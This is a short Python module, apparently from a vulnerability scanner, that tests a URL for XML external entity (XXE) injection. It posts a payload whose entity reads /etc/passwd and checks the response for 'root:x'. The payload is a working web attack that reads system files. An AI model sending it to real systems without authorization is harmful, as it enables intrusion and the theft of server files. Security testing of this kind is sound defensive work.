# vulnerability_tester/xxe_injection.py
import requests
from colorama import Fore


def test_xxe_injection(url):
    payload = """<?xml version="1.0"?>
    <!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
    <data>&xxe;</data>"""

    headers = {"Content-Type": "application/xml"}
    response = requests.post(url, data=payload, headers=headers)

    if "root:x" in response.text:
        return f"{Fore.RED}XXE Injection detected"
    return f"{Fore.GREEN}No XXE Injection"
